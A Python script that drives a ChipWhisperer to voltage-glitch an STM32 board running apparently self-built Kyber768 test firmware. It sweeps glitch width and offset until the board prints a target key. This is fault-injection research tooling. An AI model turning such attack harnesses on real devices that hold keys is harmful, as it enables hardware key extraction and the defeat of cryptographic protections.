#!/usr/bin/env python3
"""
High-Precision Glitch Attack for Kyber768
Uses CPA-derived parameters with fine-grained offset sweeping.

This attack uses:
1. Fixed ext_offset from CPA analysis (or configurable)
2. Enable-only glitching output
3. Fine offset sweeps with 0.5 increments
4. Optional phase shifting for sub-cycle precision
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import sys
from datetime import datetime
import argparse

FW_PATH = "bin/test_glitch.hex"

# Default parameters - override with --ext_offset from CPA
DEFAULT_EXT_OFFSET = 95  # From 24 MHz CPA analysis
FINE_OFFSET_RANGE = np.arange(-45.0, 45.0, 0.25)
FINE_OFFSET_RANGE = FINE_OFFSET_RANGE[FINE_OFFSET_RANGE != 0.0]  # Avoid offset=0 warning
WIDTH_OPTIONS = [0.2, 0.4, 0.6, 0.8, 1.0, 1.2]  # Minimal widths to find the crash threshold
MAX_ATTEMPTS = 30000



def setup(args):
    """Initialize ChipWhisperer for precision glitching."""
    print("="*60)
    print("PRECISION GLITCH ATTACK")
    print("="*60)
    
    scope = cw.scope()
    target = cw.target(scope)
    
    # scope.default_setup() # CAUSES 7.37MHz RESET!
    # Manual setup:
    scope.gain.db = 25
    scope.adc.samples = 5000
    scope.adc.offset = 0
    scope.adc.basic_mode = "rising_edge"
    scope.trigger.triggers = "tio4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.io.hs2 = "clkgen"
    
    scope.clock.clkgen_freq = 24000000
    time.sleep(0.5)
    if scope.clock.clkgen_freq < 20000000:
        print(f"ERROR: Clock failed to set to 24MHz. Got: {scope.clock.clkgen_freq}")
        sys.exit(1)
    
    scope.clock.adc_src = "clkgen_x4"
    target.baud = 38400
    
    # Glitch configuration - enable only for voltage glitching
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "glitch_only"
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = False # KEEP FALSE: High Power often crashes the CW USB controller
    scope.glitch.repeat = 1
    
    # Set the CPA-derived ext_offset
    scope.glitch.ext_offset = args.ext_offset
    
    return scope, target

def reset(scope, target):
    """Reset the target device with improved reliability."""
    scope.io.nrst = 'low'
    time.sleep(0.1) # Increased pulse
    scope.io.nrst = 'high' # Strong high
    time.sleep(0.1)
    scope.io.nrst = 'high_z'
    
    # Wait for "WAIT" to indicate boot complete and loop started
    t = time.time()
    buff = ""
    while time.time() - t < 1.0: # Shorter timeout for reset detection
        if target.in_waiting():
            buff += target.read()
            if "WAIT" in buff:
                return True, buff
        time.sleep(0.01)
    return False, buff

def glitch(scope, target, target_key, baseline_key, width, offset):
    """Execute a single glitch attempt with given parameters."""
    scope.glitch.width = width
    scope.glitch.offset = offset
    
    # Ensure sync - wait for next WAIT
    r = ""
    t = time.time()
    while time.time() - t < 0.2:
        if target.in_waiting():
            r += target.read()
            if "WAIT" in r:
                break
    
    if "WAIT" not in r:
        return "timeout", None, None
    
    # Arm and capture
    scope.arm()
    if scope.capture():
        return "no_trig", None, None
    
    # Read result
    r = ""
    t = time.time()
    while time.time() - t < 0.1:
        if target.in_waiting():
            r += target.read()
            if "KEY:" in r and "\n" in r[r.find("KEY:"):]:
                break
        time.sleep(0.001)
    
    if target_key in r:
        return "SUCCESS", scope.get_last_trace(), target_key
    elif baseline_key in r:
        return "normal", None, baseline_key
    elif "KEY:" in r:
        idx = r.find("KEY:") + 4
        key = r[idx:idx+70].strip().split()[0] if len(r) > idx else "?"
        return "different", None, key
    else:
        return "crash", None, None

def load_cpa_params(cpa_dir="cpa_results_24mhz"):
    """Load recommended parameters from CPA analysis."""
    param_file = f"{cpa_dir}/recommended_params.txt"
    if os.path.exists(param_file):
        params = {}
        with open(param_file) as f:
            for line in f:
                if "=" in line:
                    key, val = line.strip().split("=", 1)
                    params[key] = val
        return params
    return None

def main():
    parser = argparse.ArgumentParser(description='Precision glitch attack using CPA results')
    parser.add_argument('--ext_offset', type=int, default=None, 
                        help='Fixed ext_offset from CPA (auto-loads from cpa_results_24mhz if not specified)')
    parser.add_argument('--max_attempts', type=int, default=MAX_ATTEMPTS, help='Maximum attempts')

    args = parser.parse_args()
    
    # Try to load CPA parameters
    cpa_params = load_cpa_params()
    if args.ext_offset is None:
        if cpa_params and 'ext_offset' in cpa_params:
            args.ext_offset = int(cpa_params['ext_offset'])
            print(f"Loaded ext_offset={args.ext_offset} from CPA analysis")
        else:
            args.ext_offset = DEFAULT_EXT_OFFSET
            print(f"Using default ext_offset={args.ext_offset}")
    
    scope, target = setup(args)
    
    print(f"Programming {FW_PATH}...")
    cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
    print("OK")
    
    res_ok, out = reset(scope, target)
    if not res_ok:
        print("ERROR: Target failed to initialize after programming!")
        print(f"Received: {repr(out)}")
        scope.dis(); return
    
    # Extract keys with patience
    t = time.time()
    while time.time() - t < 5.0: # 5s is plenty for first dec
        if target.in_waiting():
            out += target.read()
        if "GOLD:" in out and "KEY:" in out:
            # Check if we have the full key (hex string ending)
            if "\n" in out[out.find("KEY:"):] and "\n" in out[out.find("GOLD:"):]:
                break
        time.sleep(0.01)
            
    if "GOLD:" not in out:
        print("ERROR: No GOLD key!", flush=True)
        print(f"Final output: {repr(out)}", flush=True)
        scope.dis(); return
    
    if "KEY:" not in out:
        print("ERROR: No baseline KEY!", flush=True)
        print(f"Final output hint: {repr(out[-100:])}", flush=True)
        scope.dis(); return
    
    idx = out.index("GOLD:") + 5
    target_key = out[idx:].strip().split()[0]
    
    idx = out.index("KEY:") + 4
    baseline_key = out[idx:].strip().split()[0]
    
    print(f"TARGET (GOLD): {target_key[:40]}...")
    print(f"BASELINE:      {baseline_key[:40]}...")
    
    print(f"\nPRECISION ATTACK PARAMETERS:")
    print(f"  ext_offset: {args.ext_offset} (FIXED from CPA)")
    print(f"  width:      {WIDTH_OPTIONS}")
    print(f"  offset:     {FINE_OFFSET_RANGE[0]:.1f} to {FINE_OFFSET_RANGE[-1]:.1f} (step 0.25)")
    print(f"Started:      {datetime.now()}")
    print("="*60)
    
    os.makedirs("traces_precision", exist_ok=True)
    
    total = crashes = timeouts = normal = different = no_trig = 0
    consecutive_timeouts = 0
    
    try:
        while total < args.max_attempts:
            scope.glitch.ext_offset = args.ext_offset
            
            for w in WIDTH_OPTIONS:
                for off in FINE_OFFSET_RANGE:
                    total += 1
                    
                    res, trace, key = glitch(scope, target, target_key, baseline_key, w, off)
                    
                    if res == "different":
                        consecutive_timeouts = 0
                        different += 1
                        # Smart retry sub-sweep
                        for i in range(5):
                            res_r, trace_r, key_r = glitch(scope, target, target_key, baseline_key, w, off)
                            if res_r == "SUCCESS":
                                res = "SUCCESS"; trace = trace_r; key = key_r
                                break
                            elif res_r == "crash":
                                reset(scope, target); break
                                
                    if res == "SUCCESS":
                        print(f"\n*** SUCCESS! attempts={total} ***")
                        print(f"ext_offset={args.ext_offset}, width={w}, offset={off}")
                        np.save(f"traces_precision/SUCCESS_e{args.ext_offset}_w{w}_o{off}.npy", trace)
                        with open("KYBER_SUCCESS_PRECISION.txt", "w") as f:
                            f.write(f"SUCCESS!\next_offset={args.ext_offset}\nwidth={w}\noffset={off}\nattempts={total}\n")
                        scope.dis(); return
                    
                    elif res == "normal":
                        normal += 1
                        consecutive_timeouts = 0
                    elif res == "crash":
                        crashes += 1
                        consecutive_timeouts = 0
                        reset(scope, target)
                    elif res == "timeout":
                        timeouts += 1
                        consecutive_timeouts += 1
                        if consecutive_timeouts > 10:
                            print("\nFATAL: Sync lost (10 consecutive timeouts). Restarting target...")
                            res_ok, _ = reset(scope, target)
                            if not res_ok:
                                print("FATAL: Target is dead. Plug/Unplug required.")
                                scope.dis(); return
                            consecutive_timeouts = 0
                        else:
                            reset(scope, target)
                    elif res == "no_trig":
                        no_trig += 1
                        reset(scope, target)
                    
                    # LIVE PROGRESS
                    if total % 25 == 0:
                        print(".", end="", flush=True)
                    if total % 250 == 0:
                        print(f" {total} | T:{timeouts} C:{crashes} D:{different}", flush=True)
        
        print(f"\nNo success after {total} attempts.")
    
    except KeyboardInterrupt:
        print(f"\nStopped at {total}")
    finally:
         try:
             scope.dis(); target.dis()
         except:
             pass

if __name__ == "__main__":
    main()
